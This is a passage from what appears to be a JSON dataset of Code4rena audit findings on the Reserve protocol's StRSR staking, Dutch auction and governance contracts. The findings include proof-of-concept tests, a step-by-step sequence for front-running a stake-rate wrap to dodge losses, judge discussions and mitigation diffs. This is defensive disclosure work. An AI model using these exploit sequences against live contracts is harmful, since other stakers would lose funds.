require(stakes[era][account] >= stakeAmount, \"insufficient balance\");\n        _payoutRewards();\n        _burn(account, stakeAmount);\n\n        uint256 newStakeRSR = (FIX_ONE_256 * totalStakes + (stakeRate - 1)) / stakeRate;\n        uint256 rsrAmount = stakeRSR - newStakeRSR;\n        stakeRSR = newStakeRSR;\n\n    279:    (uint256 index, uint64 availableAt) = pushDraft(account, rsrAmount);\n    }\n\nThis request enters a `queue`, which we assume is empty at this point, making the `withdrawal` available at `T + 1 day` (`line 658`).\n\n    function pushDraft(address account, uint256 rsrAmount)\n        internal\n        returns (uint256 index, uint64 availableAt)\n    {\n        CumulativeDraft[] storage queue = draftQueues[draftEra][account];\n        index = queue.length;  // index = 0\n\n        uint192 oldDrafts = index != 0 ? queue[index - 1].drafts : 0; // 0\n        uint64 lastAvailableAt = index != 0 ? queue[index - 1].availableAt : 0; // 0\n    658:    availableAt = uint64(block.timestamp) + unstakingDelay; // T + 1 day\n\n        if (lastAvailableAt > availableAt) {\n            availableAt = lastAvailableAt;\n        }\n        queue.push(CumulativeDraft(uint176(oldDrafts + draftAmount), availableAt));\n    }\n\nNow, let's assume the user `cancels` this `withdrawal` at time `T` for testing purposes. Instead of removing the `withdrawal` from the `queue`, we simply increase the `first available ID`, which is a good approach and is easy to implement (`line 368`).\n\n    function cancelUnstake(uint256 endId) external {\n        uint256 firstId = firstRemainingDraft[draftEra][account];\n        CumulativeDraft[] storage queue = draftQueues[draftEra][account];\n        if (endId == 0 || firstId >= endId) return;\n\n        require(endId <= queue.length, \"index out-of-bounds\");\n\n    368:    firstRemainingDraft[draftEra][account] = endId;\n    }\n\nEven though the `queue` technically still contains one item (the `canceled` `withdrawal` request), we can consider the `queue` empty in terms of available `withdrawals`.\n\nLater, the owner updates the `unstakingDelay` to `1 hour`.<br>\nThe user attempts to `unstake` again, expecting to `withdraw` just `1 hour` later, which should be possible.<br>\nHowever, the canceled `withdrawal` still impacts this new request.\n\nIn `line 654`, the `index` is `1` , and in `line 657`, `lastAvailableAt` is set to `T + 1 day` due to the canceled `withdrawal`.<br>\nAs a result, in `line 658`, the `availableAt` for the new `withdrawal` is calculated as `T + 1 hour`, but since this is less than `T + 1 day`, the new `withdrawal` is also pushed to be available `1 day` later.\n\n    function pushDraft(address account, uint256 rsrAmount)\n        internal\n        returns (uint256 index, uint64 availableAt)\n    {\n        CumulativeDraft[] storage queue = draftQueues[draftEra][account];\n    654:    index = queue.length;  // index = 1\n\n        uint192 oldDrafts = index != 0 ? queue[index - 1].drafts : 0; // 0\n    657:    uint64 lastAvailableAt = index != 0 ? queue[index - 1].availableAt : 0; // T + 1 day\n    658:    availableAt = uint64(block.timestamp) + unstakingDelay; // T + 1 hour\n\n        if (lastAvailableAt > availableAt) {\n            availableAt = lastAvailableAt;\n        }\n        queue.push(CumulativeDraft(uint176(oldDrafts + draftAmount), availableAt));\n    }\n\nThis situation is clearly unfair to the user.\n\nThe `availableAt` of `canceled withdrawals` should not be considered when determining the availability of new `withdrawals`.\n\nPlease add below test to the `test/ZZStRSR.test.ts`\n\n<details>\n\n```\n    describe('PushDraft Test', () => {\n      it('Should use current unstakingDelay', async () => {\n        // old unstakingDelay is 1 day\n        const oldUnstakingDelay = 3600 * 24\n        await stRSR.connect(owner).setUnstakingDelay(oldUnstakingDelay)  \n        const amount: BigNumber = bn('100e18')\n        await rsr.connect(addr1).approve(stRSR.address, amount)\n        await stRSR.connect(addr1).stake(amount)\n      \n        const draftEra = 1\n        const availableAtOfFirst = await getLatestBlockTimestamp() + oldUnstakingDelay + 1\n        /**\n         * Unstaking request enter a queue, and withdrawal become available 1 day later\n         */\n        await expect(stRSR.connect(addr1).unstake(amount))\n          .emit(stRSR, 'UnstakingStarted')\n          .withArgs(0, draftEra, addr1.address, amount, amount, availableAtOfFirst)\n      \n        /**\n         * Cancel the unstaking to eliminate any pending withdrawals\n         */\n        await stRSR.connect(addr1).cancelUnstake(1)\n      \n        // new unstakingDelay is 1 hour\n        const newUnstakingDelay = 3600\n        await stRSR.connect(owner).setUnstakingDelay(newUnstakingDelay)  \n      \n        await rsr.connect(addr2).approve(stRSR.address, amount)\n        await stRSR.connect(addr2).stake(amount)\n      \n        const availableAtOfFirstOfUser2 = await getLatestBlockTimestamp() + newUnstakingDelay + 1\n        /**\n         * Unstaking request enter a queue, and withdrawal become available 1 hour later for a second user\n         */\n        await expect(stRSR.connect(addr2).unstake(amount))\n          .emit(stRSR, 'UnstakingStarted')\n          .withArgs(0, draftEra, addr2.address, amount, amount, availableAtOfFirstOfUser2)\n      \n        /**\n         * Although the first unstaking was canceled, its available time still impacts subsequent unstaking requests\n         */\n        await expect(stRSR.connect(addr1).unstake(amount))\n          .emit(stRSR, 'UnstakingStarted')\n          .withArgs(1, draftEra, addr1.address, amount, amount, availableAtOfFirst)\n      })\n    })\n```\n\n</details>\n\n### Recommended Mitigation Steps\n\n    function pushDraft(address account, uint256 rsrAmount)\n        internal\n        returns (uint256 index, uint64 availableAt)\n    {\n        CumulativeDraft[] storage queue = draftQueues[draftEra][account];\n        index = queue.length;  \n\n        uint192 oldDrafts = index != 0 ? queue[index - 1].drafts : 0; \n        \n    -    uint64 lastAvailableAt = index != 0 ? queue[index - 1].availableAt : 0; \n    +    uint64 lastAvailableAt = index != 0 && firstRemainingDraft[draftEra][account] < index ? queue[index - 1].availableAt : 0; \n\n        availableAt = uint64(block.timestamp) + unstakingDelay; \n\n        if (lastAvailableAt > availableAt) {\n            availableAt = lastAvailableAt;\n        }\n        queue.push(CumulativeDraft(uint176(oldDrafts + draftAmount), availableAt));\n    }\n\n**[akshatmittal (Reserve) commented](https://github.com/code-423n4/2024-07-reserve-findings/issues/18#issuecomment-2313004127):**\n > Issue confirmed.\n> \n> Although, want to downgrade to Low given the requirements, actions and impact.\n\n**[cccz (judge) decreased severity to Low and commented](https://github.com/code-423n4/2024-07-reserve-findings/issues/18#issuecomment-2315894925):**\n > Considering the low likelihood (owner reduces unstakingDelay, user cancels withdrawals before that) and the earlier the cancellation, the lower the impact, it will be downgraded to Low.\n\n**[ether\\_sky (warden) commented](https://github.com/code-423n4/2024-07-reserve-findings/issues/18#issuecomment-2319565858):**\n > Hi @cccz - thanks for your review.\n> \n> Let me clarify the `impact` and `likelihood` again.<br>\n> As seen in the code below, the `minimum unstaking delay` is `2 minutes`, and the `maximum` is `1 year`. There's a significant difference between these two values.\n> ```\n> uint48 private constant MIN_UNSTAKING_DELAY = 60 * 2; // {s} 2 minutes\n> uint48 private constant MAX_UNSTAKING_DELAY = 60 * 60 * 24 * 365; // {s} 1 year\n> ```\n> \n> Suppose the current `unstaking delay` is set to the `1 year`.<br>\n> All `stakers` are operating under this `delay` now.<br>\n> For various reasons, the `admin` decides to reduce the `unstaking delay` to a shorter period, say `1 month`.<br>\n> `Stakers` will realize they can `withdraw` their funds after `1 month` instead of `1 year`.<br>\n> They can cancel their existing `withdrawal requests` and attempt to `unstake` again.<br>\n> However, the original `1-year` `delay` still applies to all `stakers`, meaning they cannot `withdraw` their funds after just `1 month`—even if they `cancel` their old `withdrawals`.<br>\n> Their funds remain `locked` for `1 year`.\n> \n> > Considering the low likelihood (owner reduces unstakingDelay, user cancels withdrawals before that) and the earlier the cancellation, the lower the impact, it will be downgraded to Low\n> \n> Regarding the `likelihood`, users do not need to `cancel` their `withdrawals` before the owner changes the `unstaking delay`. Even if they `cancel` their `withdrawals` anytime after the `delay` is changed, the old `delay` still impacts all `stakers`.\n> \n> As for the `impact`, this situation results in users' `funds` being locked and creates a DoS issue.\n> \n> Given these points, I believe the `impact` and `likelihood` are at least `medium`. I would appreciate it if you could reconsider this issue.\n\n**[cccz (judge) increased severity to Medium and commented](https://github.com/code-423n4/2024-07-reserve-findings/issues/18#issuecomment-2322722550):**\n > When the owner reduces unstakingDelay, the user will not be able to apply the latest unstakingDelay even if they cancel the previous withdrawal.<br>\n> If this is correct, I tend to raise it to Medium.\n\n**[Reserve mitigated](https://github.com/code-423n4/2024-09-reserve-mitigation?tab=readme-ov-file#findings-being-mitigated)**\n\n**Status:** Mitigation confirmed. Full details in reports from [Bauchibred](https://github.com/code-423n4/2024-09-reserve-mitigation-findings/issues/6), [ether_sky](https://github.com/code-423n4/2024-09-reserve-mitigation-findings/issues/28) and [RadiantLabs](https://github.com/code-423n4/2024-09-reserve-mitigation-findings/issues/22).\n\n***\n\n",
      "summary": "\nThe bug report is about a bug in the code of a smart contract. The contract is used to manage a reserve of tokens, and the bug affects the process of unstaking tokens. When users want to unstake their tokens, they have to wait for a specific period of time before they can withdraw them. This period is set by the contract owner and can range from 2 minutes to 1 year. The bug causes a delay in the withdrawal process, even if users cancel their withdrawal requests. This means that users may have to wait longer than expected to withdraw their tokens, and this can lead to a denial of service issue. The bug has been confirmed and is considered to have a medium impact and likelihood. It has been mitigated by the contract owner.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2024-07-reserve",
      "github_link": "https://github.com/code-423n4/2024-07-reserve-findings/issues/18",
      "tags": [],
      "finders": [
        "Bauchibred",
        "ether\\_sky"
      ]
    },
    {
      "id": "41014",
      "title": "[M-05] Users can dodge losses due to StRSR era changes with instant operations",
      "impact": "MEDIUM",
      "content": "\nThe StRSR contract implements an era-based wrapping of the `stakeRate` and `draftRate` exchange rates whenever these pass the maximum accepted value of `MAX_STAKE_RATE` and `MAX_DRAFT_RATE`; the effect of this action is that StRSR token holders see their balance reset (`stakeRate` reset) and/or all StRSR vesting withdraws are forgotten and the relative funds lost (`draftRate` reset).\n\nFrom the code below, we can see that these two rates can be reset independently;\n\n```Solidity\nFile: StRSR.sol\n424:     function seizeRSR(uint256 rsrAmount) external {\n---\n440:         // Remove RSR from stakeRSR\n441:         uint256 stakeRSRToTake = (stakeRSR * rsrAmount + (rsrBalance - 1)) / rsrBalance;\n442:         stakeRSR -= stakeRSRToTake;\n443:         seizedRSR = stakeRSRToTake;\n444: \n445:         // update stakeRate, possibly beginning a new stake era\n446:         if (stakeRSR != 0) {\n447:             // Downcast is safe: totalStakes is 1e38 at most so expression maximum value is 1e56\n448:             stakeRate = uint192((FIX_ONE_256 * totalStakes + (stakeRSR - 1)) / stakeRSR);\n449:         }\n450:         if (stakeRSR == 0 || stakeRate > MAX_STAKE_RATE) {\n451:             seizedRSR += stakeRSR;\n452:             beginEra();\n453:         }\n454: \n455:         // Remove RSR from draftRSR\n456:         uint256 draftRSRToTake = (draftRSR * rsrAmount + (rsrBalance - 1)) / rsrBalance;\n457:         draftRSR -= draftRSRToTake;\n458:         seizedRSR += draftRSRToTake;\n459: \n460:         // update draftRate, possibly beginning a new draft era\n461:         if (draftRSR != 0) {\n462:             // Downcast is safe: totalDrafts is 1e38 at most so expression maximum value is 1e56\n463:             draftRate = uint192((FIX_ONE_256 * totalDrafts + (draftRSR - 1)) / draftRSR);\n464:         }\n465: \n466:         if (draftRSR == 0 || draftRate > MAX_DRAFT_RATE) {\n467:             seizedRSR += draftRSR;\n468:             beginDraftEra();\n469:         }\n```\n\n... and we'd then argue that they will most likely happen at different times, at the very least because rewards contribute to the evolution of `stakeRate` only.\n\nIn the event only one of the two rates reaches the cap and undergoes a reset, stakers can dodge the bullet of collectivized losses, by:\n\n*   sandwiching the `stakeRate` wrapping with `unstake` and `cancelUnstake` calls\n*   sandwiching the `draftRate` wrapping with `cancelUnstake` and `unstake` calls\n\n### Impact\n\nUsers can avoid the collectivization of rate wrapping losses, and artificially get a share of any RSR left in the StRSR contract.\n\nThis latter quantity may be considerable, because while unlikely, it's not impossible that the rate wrapping happens when little RSR is seized from an otherwise large RSR balance in the StRSR contract.\n\n### Proof of Concept\n\nAlice is an StRSR token holder:\n\n*   she notices that a transaction will soon cause RSR to be seized and the `stakeRate` will wrap to 1.0\n*   she immediately initiates an `unstake`, so her funds are moved to the drafts bucket\n*   immediately after the transaction that wraps the `stakeRate`, she calls `cancelUnstake`\n*   Alice lost only the pro-rata RSR that was seized (which may be minimal) while others lost everything\n\nA similar sequence can be performed to avoid losses on funds that are being unstaked by instead calling `cancelUnstake` first and `unstake` later.\n\n### Tools Used\n\nCode review, Foundry\n\n### Recommended Mitigation Steps\n\nConsider wrapping both rates when at least one reaches the maximum.\n\n**[tbrent (Reserve) acknowledged and commented](https://github.com/code-423n4/2024-07-reserve-findings/issues/21#issuecomment-2313071106):**\n > The wrapping occurs at the `MAX_STAKE_RATE` or `MAX_DRAFT_RATE`, ie 1e27. \n> \n> `resetStakes()` is available to governance above `MAX_SAFE_STAKE_RATE`, ie 1e24. \n> \n> StRSR is unstable between these bounds, but the risk of it occurring is assumed low enough to be not worth further mitigating. See: https://github.com/reserve-protocol/protocol/blob/72fc1f6e41da01e733c0a7e96cdb8ebb45bf1065/contracts/p1/StRSR.sol#L490\n> \n> >///     The stake rate is unsafe when it is either too high or too low.\n>     ///     There is the possibility of the rate reaching the borderline of being unsafe,\n>     ///     where users won't stake in fear that a reset might be executed.\n>     ///     A user may also grief this situation by staking enough RSR to vote against any reset.\n>     ///     This standoff will continue until enough RSR is staked and a reset is executed.\n>     ///     There is currently no good and easy way to mitigate the possibility of this situation,\n>     ///     and the risk of it occurring is low enough that it is not worth the effort to mitigate.\n> \n> The reported issue requires the same set of assumptions to get into this state, and then additional assumptions about the size of the next `seizeRSR()`. However, the impact trades off directly against the likelihood: the further the rate is away from the 1e27 bounds, the less likely this case is to occur. The closer to 1e27, the more clear it is to governance that they need to `resetStakes()`. And there are 3 orders of magnitude between 1e27 and 1e24 for this dynamic to play out. \n> \n> We would like to acknowledge the issue but dispute severity to Low, given it is a subset of a case already assumed low enough probability to not be worth mitigating. \n\n**[cccz (judge) decreased severity to Low](https://github.com/code-423n4/2024-07-reserve-findings/issues/21#issuecomment-2315861390)**\n\n**[3docSec (warden) commented](https://github.com/code-423n4/2024-07-reserve-findings/issues/21#issuecomment-2318743268):**\n > Hi @cccz and @tbrent - the `require` statement in `resetStakes` makes this function a viable option to mitigate only the issue in case of `stakeRate` being close to wrapping, but does not help with the other scenario presented by this issue - that is when `draftRate` wraps.\n> \n> ```Solidity\n>     function resetStakes() external {\n>         _requireGovernanceOnly();\n>         require(\n>             stakeRate <= MIN_SAFE_STAKE_RATE || stakeRate >= MAX_SAFE_STAKE_RATE,\n>             \"rate still safe\"\n>         );\n> \n>         beginEra();\n>         beginDraftEra();\n>     }\n> ```\n> \n> Because `draftRate` normally goes only up with `seizeRSR`, and `stakeRate` instead goes up with `seizeRSR` but [also goes down with `_payoutRewards`](https://github.com/code-423n4/2024-07-reserve/blob/3f133997e186465f4904553b0f8e86ecb7bbacbf/contracts/p1/StRSR.sol#L621), it is still possible that `draftRate` grows close to `MAX_STAKE_RATE` while `stakeRate` is still below `MAX_SAFE_STAKE_RATE`. This scenario would prevent governance intervention, entering a situation where a `draftRate` wrapping alone is inevitable.\n> \n> I would therefore ask you to reconsider the Medium severity, and potentially consider another mitigation option in allowing calls to `resetStakes` also when `draftRate` grows above `MAX_SAFE_STAKE_RATE`.\n\n**[tbrent (Reserve) commented](https://github.com/code-423n4/2024-07-reserve-findings/issues/21#issuecomment-2319466907):**\n > That is a good point: `resetStakes()` cannot be used when it is the draft rate that is out of bounds. I think there is a change to the code to make there of some variety.\n> \n> Still, in order for the below to be true:\n> \n> > draftRate grows close to `MAX_STAKE_RATE` while stakeRate is still below `MAX_SAFE_STAKE_RATE`.\n> \n> there must be at least 1000x historical appreciation of StRSR overall. This is an additional assumption beyond the initial assumptions of: (i) draftRate grows close to `MAX_STAKE_RATE` (requires consecutive nearly full-but-not-full seizures); (ii) can frontrun `seizeRSR()`.\n\n**[cccz (judge) increased severity to Medium and commented](https://github.com/code-423n4/2024-07-reserve-findings/issues/21#issuecomment-2322910972):**\n > Based on the above conversation, users can frontrun resetStakes to avoid losses or get benefits. If this is correct, I would consider this issue to be low likelihood + high impact = Medium severity.\n\n**[Reserve mitigated](https://github.com/code-423n4/2024-09-reserve-mitigation?tab=readme-ov-file#findings-being-mitigated)**\n\n**Status:** Mitigation confirmed. Full details in reports from [ether_sky](https://github.com/code-423n4/2024-09-reserve-mitigation-findings/issues/27) and [Bauchibred](https://github.com/code-423n4/2024-09-reserve-mitigation-findings/issues/5).\n\n***\n\n",
      "summary": "\nThe StRSR contract has a bug where the `stakeRate` and `draftRate` exchange rates may be reset when they reach the maximum value of `MAX_STAKE_RATE` and `MAX_DRAFT_RATE`. This can result in StRSR token holders losing their balance or having their withdraws forgotten. The code shows that these rates can be reset separately, which means that users can avoid losing their funds by using specific calls. This bug can be exploited to gain additional RSR from the StRSR contract. The team has acknowledged the issue and is considering mitigating it by wrapping both rates when at least one reaches the maximum value. The severity of this bug has been debated, with some members of the team considering it to be low severity due to the low likelihood of it occurring. However, others argue that it should be considered a medium severity issue due to the potential impact it can have if it does occur. The team has confirmed that they will be mitigating this bug. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2024-07-reserve",
      "github_link": "https://github.com/code-423n4/2024-07-reserve-findings/issues/21",
      "tags": [],
      "finders": [
        "RadiantLabs"
      ]
    },
    {
      "id": "41013",
      "title": "[M-04] Dutch auctions can fail to settle if any other collateral in the basket behaves unexpectedly",
      "impact": "MEDIUM",
      "content": "\nWhen a Dutch auction that originated from the backing manager receives a bid, it [calls](https://github.com/code-423n4/2024-07-reserve/blob/3f133997e186465f4904553b0f8e86ecb7bbacbf/contracts/plugins/trading/DutchTrade.sol#L222) `BackingManager.settleTrade()` to settle the auction immediately, which [attempts to chain](https://github.com/code-423n4/2024-07-reserve/blob/3f133997e186465f4904553b0f8e86ecb7bbacbf/contracts/p1/BackingManager.sol#L92) into another `rebalance()` call. This chaining is implemented using a try-catch block that attempts to catch out-of-gas errors.\n\nHowever, this pattern is not safe because empty error data does not always indicate an out-of-gas error. Other types of errors also return no data, such as calls to empty addresses casted as contracts and revert / require statements with no error message.\n\nThe `rebalance()` function interacts with multiple external assets and performs several operations that can throw empty errors:\n\n1.  In `basketsHeldBy()`, which calls `_quantity()`, which in turn calls `coll.refPerTok()` (this function should in theory [never revert](https://github.com/3docSec/2024-07-reserve/blob/main/docs/collateral.md#refpertok-reftok), but in case it interacts with the underlying ERC20, its implementation may have been upgraded to one that does).\n2.  In `prepareRecollateralizationTrade()`, which calls `basketRange()`, which also calls `_quantity()`.\n3.  In `tryTrade()` if a new rebalancing trade is indeed chained, which calls `approve()` on the token via `AllowanceLib.safeApproveFallbackToMax()`. This is a direct interaction with the token and hence cannot be trusted, especially if the possibility of [upgradeability](https://github.com/code-423n4/2024-07-reserve/tree/3f133997e186465f4904553b0f8e86ecb7bbacbf?tab=readme-ov-file#erc20-token-behaviors-in-scope) is considered.\n\nIf any of these operations result in an empty error, the auction settlement will fail. This can lead to the Dutch auction being unable to settle at a fair price.\n\nNote: we have found [this](https://github.com/code-423n4/2023-06-reserve-findings/issues/8) finding pointing out the very same issue in a previous audit, but this report highlights a different root cause in where the error originates.\n\n### Impact\n\nDutch auctions may fail to settle at the appropriate price or at all.\n\n### Proof of Concept\n\n1.  A Dutch auction is initiated for rebalancing collateral.\n2.  After some time, a bidder attempts to submit a bid at fair market value.\n3.  `BackingManager.settleTrade()` is called by the trade contract.\n4.  The `rebalance()` function is called within the try-catch block.\n5.  The underlying ERC-20 of one of the collateral assets in the basket has an empty revert clause that currently throws when one of its functions is called.\n6.  The catch block receives an empty error and reverts the transaction.\n\n### Recommended Mitigation Steps\n\nAvoid usage of this pattern to catch OOG errors in any functions that cannot revert and may interact with external contracts. Instead, in such cases always employ the [`_reserveGas()`](https://github.com/code-423n4/2024-07-reserve/blob/3f133997e186465f4904553b0f8e86ecb7bbacbf/contracts/p1/AssetRegistry.sol#L253) pattern that was iterated on to mitigate previous findings ([1](https://github.com/code-423n4/2023-01-reserve-findings/issues/254), [2](https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/73), [3](https://github.com/code-423n4/2023-06-reserve-findings/issues/7)) with a similar root cause. We have found no other instances in which this applies.\n\n**[akshatmittal (Reserve) disputed and commented](https://github.com/code-423n4/2024-07-reserve-findings/issues/32#issuecomment-2313014540):**\n > 1. This is a known issue.\n> 2. The ERC20 upgrade to return _empty_ revert data on calling _any_ of its functions seems a little far fetched.\n\n**[EV\\_om (warden) commented](https://github.com/code-423n4/2024-07-reserve-findings/issues/32#issuecomment-2322924095):**\n > We do not think this should be considered a known issue either, unless it was accepted in a previous competition or pointed out in an audit.\n> \n> An empty revert in one function of a collateral asset being characterized as far-fetched is a little surprising, considering findings were accepted in previous Reserve audits for the same situation but the token [reverting](https://github.com/code-423n4/2023-01-reserve-findings/issues/254), [consuming all gas](https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/73) and [consuming a specific amount of gas](https://github.com/code-423n4/2023-06-reserve-findings/issues/7).\n> \n> All those findings concerned the ability to unregister a misbehaving asset, which we found to now be guaranteed. However, we found an asset misbehaving could also have the additional impact of preventing auctions from settling for a different asset. This same impact was accepted as valid for a different root cause [here](https://github.com/code-423n4/2023-06-reserve-findings/issues/8).\n> \n> Again, an empty revert is nothing unusual and a simple `require()` with no error message will produce it.\n> \n> We think this scenario is very much realistic and would like to kindly ask for it to be reassessed.\n\n**[cccz (judge) commented](https://github.com/code-423n4/2024-07-reserve-findings/issues/32#issuecomment-2323610119):**\n > @akshatmittal and @tbrent - This seems to be a possible upgrade, please take a look, thanks!<br>\n> > Again, an empty revert is nothing unusual and a simple require() with no error message will produce it.\n\n**[akshatmittal (Reserve) commented](https://github.com/code-423n4/2024-07-reserve-findings/issues/32#issuecomment-2324874396):**\n > Looking back at this again @cccz.\n> \n> The first two statements which hinge on `refPerTok` reverting are not valid since we _require_ `refPerTok` to not revert. If a collateral plugin does revert on it, it must be fixed and replaced. The third example however, the approve one, is where I can see the token revert causing issues.\n> \n> I currently can not see any sane ERC20 reverting on an `approve` case with no message, however you may have better examples than I do. I still consider it highly unlikely, although if you do have examples to share I'll consider them.\n> \n> And honestly, I currently do not see how to do better. For a little more context on that, we want settle to start a new auction, which is why that revert exists there, and we can't use the `_reserveGas` pattern here since the gas cost for `rebalance` is unbound.\n> \n> RTokens are designed to be governance focused, and we already have the requirement for Governance to only include collaterals they absolutely trust (which is why you'd see all RTokens today use blue chip assets _only_).\n> \n> If you absolutely _must_ consider it valid, I'd probably bring it down to Low/QA given the requirements here, but also looking for your thoughts.\n\n**[cccz (judge) commented](https://github.com/code-423n4/2024-07-reserve-findings/issues/32#issuecomment-2325010694):**\n > @EV\\_om - If there's no example, I'll invalidate it because the assumption isn't valid.\n\n**[EV\\_om (warden) commented](https://github.com/code-423n4/2024-07-reserve-findings/issues/32#issuecomment-2325096209):**\n > @cccz - [USDT](https://etherscan.io/token/0xdac17f958d2ee523a2206206994597c13d831ec7#code) and [BNB](https://etherscan.io/token/0xB8c77482e45F1F44dE1745F52C74426C631bDD52#code) throw empty errors on reverts within `approve()`, for instance.\n> \n> These are the two largest market cap ERC-20 tokens in existence - again, this is not some theoretical esoteric behaviour but a realistic scenario.\n> \n> There may not be a better approach if the gas cost of `rebalance()` is unbounded as you say @akshatmittal. But lack of an immediate mitigation does not invalidate the issue/make it QA.\n\n**[akshatmittal (Reserve) commented](https://github.com/code-423n4/2024-07-reserve-findings/issues/32#issuecomment-2325120179):**\n > @EV\\_om - Both of the examples you have mentioned throw on zero, which is a case handled within the code. (Also just saying here, BNB isn't technically a supported token for other reasons)\n> \n> > this is not some theoretical esoteric behaviour but a realistic scenario.\n> \n> Believe me, I'm not trying to say so. I'm really trying to find a realistic case where an _upgrade_ on the token makes it _regress_ in a basic ERC20 function.\n> \n> And yeah, I'm also not saying not having a mitigation invalidates the issue, but rather that the protocol has ways of dealing with such specific things like wrapping the tokens, etc. We already wrap tokens that we don't like behaviours of, or tokens that have weird behaviours.\n> \n> (Talking to cccz to accept this, just trying to get a better idea)\n\n**[cccz (judge) commented](https://github.com/code-423n4/2024-07-reserve-findings/issues/32#issuecomment-2325140658):**\n > Although the likelihood is low, the assumed token satisfies acceptable upgradability, will upgrade it to Medium.\n\n\n***\n\n",
      "summary": "\nThe report discusses a bug in a Dutch auction where if a bid is received, it calls a function to settle the auction immediately. However, this function may fail due to a pattern used to catch out-of-gas errors. This pattern is not safe as it may also catch other types of errors, leading to the auction being unable to settle at a fair price. The impact of this bug is that Dutch auctions may fail to settle properly. The report suggests avoiding the use of this pattern and instead using a different approach to mitigate the issue. The team behind the project has disputed the issue, stating that it is a known issue and that the likelihood of it occurring is low. However, the judges have decided to classify it as a medium issue due to the potential impact and the fact that it could occur in realistic scenarios. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2024-07-reserve",
      "github_link": "https://github.com/code-423n4/2024-07-reserve-findings/issues/32",
      "tags": [],
      "finders": [
        "RadiantLabs"
      ]
    },
    {
      "id": "41012",
      "title": "[M-03] The default Governor Anastasius is unable to call `resetStakes`",
      "impact": "MEDIUM",
      "content": "\nThe `StRSR` contract contains a function [`resetStakes`](https://github.com/code-423n4/2024-07-reserve/blob/main/contracts/p1/StRSR.sol#L490), which is used to reset the staking of a specific RToken system, when the stake rate becomes unsafe. When this happens, the `era` of the staking contract is incremented, which practically resets the `StRSR` token. Since this is a sensitive action, only governance can call this function.\n\nThe Reserve team provides a default and recommended `Governance` contract with `TimelockController`, which handles the proposal creation and execution. The contract also ensures that proposals created in a past era can not be queued or executed in the current era since the voting conditions can differ between eras. However due to this check, it is impossible for the `Governance` contract to call `resetStakes`, since the function would increment the era, and the following check whether the proposal was proposed in the same era would not hold and revert the transaction.\n\n### Proof of Concept\n\nThe following test added to [ZZStRSR.tests.ts](https://github.com/code-423n4/2024-07-reserve/blob/main/test/ZZStRSR.test.ts) supports the issue:\n\n<details>\n\n```typescript\nit.only(\"Impossible to reset stakes with Governor Anastasius\", async () => {\n  // Setup governance\n  const ONE_DAY = 86400;\n  const VOTING_DELAY = ONE_DAY;\n  const VOTING_PERIOD = ONE_DAY * 3;\n  const MIN_DELAY = ONE_DAY * 7;\n\n  let GovernorFactory = await ethers.getContractFactory(\"Governance\");\n  let stRSRVotes = await ethers.getContractAt(\"StRSRP1Votes\", stRSR.address);\n  let TimelockFactory = await ethers.getContractFactory(\"TimelockController\");\n  let timelock = <TimelockController>(\n    await TimelockFactory.deploy(MIN_DELAY, [], [], owner.address)\n  );\n\n  let governor = await GovernorFactory.deploy(\n    stRSRVotes.address,\n    timelock.address,\n    VOTING_DELAY,\n    VOTING_PERIOD, // voting period\n    0, // threshold set to 0 just to showcase the issue\n    0 // quorum percentage set to 0 just to showcase the issue\n  );\n\n  /////////////////////////////////////////\n  ///                                   ///\n  /// First step: update timelock roles ///\n  ///                                   ///\n  /////////////////////////////////////////\n\n  const proposerRole = await timelock.PROPOSER_ROLE();\n  const executorRole = await timelock.EXECUTOR_ROLE();\n  const cancellerRole = await timelock.CANCELLER_ROLE();\n  const adminRole = await timelock.TIMELOCK_ADMIN_ROLE();\n\n  await timelock.grantRole(proposerRole, governor.address);\n  await timelock.grantRole(executorRole, governor.address);\n  await timelock.grantRole(cancellerRole, governor.address);\n  await timelock.revokeRole(adminRole, owner.address);\n\n  // Then we will update the owner to a new decentralized Governor Anastasius\n  await main.connect(owner).grantRole(OWNER, governor.address);\n  await main.connect(owner).renounceRole(OWNER, owner.address);\n\n  //////////////////////////////////////////\n  ///                                    ///\n  /// Second step: MAKE THE RATES UNSAFE ///\n  ///                                    ///\n  //////////////////////////////////////////\n\n  const stakeAmt: BigNumber = bn(\"1000e18\");\n  const addAmt1: BigNumber = bn(\"100e18\");\n  const addAmt2: BigNumber = bn(\"120e30\");\n\n  // Stake\n  await rsr.connect(addr1).approve(stRSR.address, stakeAmt);\n  await stRSR.connect(addr1).stake(stakeAmt);\n\n  expect(await stRSR.exchangeRate()).to.equal(fp(\"1\"));\n  expect(await stRSR.totalSupply()).to.equal(stakeAmt);\n  expect(await stRSR.balanceOf(addr1.address)).to.equal(stakeAmt);\n\n  // Add RSR to decrease stake rate - still safe\n  await rsr.connect(owner).transfer(stRSR.address, addAmt1);\n\n  // Advance to the end of noop period\n  await advanceToTimestamp((await getLatestBlockTimestamp()) + 1);\n  await stRSR.payoutRewards();\n\n  // Calculate payout amount\n  const decayFn = makeDecayFn(await stRSR.rewardRatio());\n  const addedRSRStake = addAmt1.sub(decayFn(addAmt1, 1)); // 1 round\n  const newRate: BigNumber = fp(stakeAmt.add(addedRSRStake)).div(stakeAmt);\n\n  // Payout rewards - Advance to get 1 round of rewards\n  await setNextBlockTimestamp((await getLatestBlockTimestamp()) + 1);\n  await expect(stRSR.payoutRewards()).to.emit(stRSR, \"ExchangeRateSet\");\n  expect(await stRSR.exchangeRate()).to.be.closeTo(newRate, 1);\n  expect(await stRSR.totalSupply()).to.equal(stakeAmt);\n  expect(await stRSR.balanceOf(addr1.address)).to.equal(stakeAmt);\n\n  // Add a large amount of funds - rate will be unsafe\n  await rsr.connect(owner).mint(owner.address, addAmt2);\n  await rsr.connect(owner).transfer(stRSR.address, addAmt2);\n\n  // Advance to the end of noop period\n  await setNextBlockTimestamp((await getLatestBlockTimestamp()) + 1);\n  await stRSR.payoutRewards();\n\n  // Payout rewards - Advance time - rate will be unsafe\n  await setNextBlockTimestamp((await getLatestBlockTimestamp()) + 100);\n  await expect(stRSR.payoutRewards()).to.emit(stRSR, \"ExchangeRateSet\");\n  expect(await stRSR.exchangeRate()).to.be.gte(fp(\"1e6\"));\n  expect(await 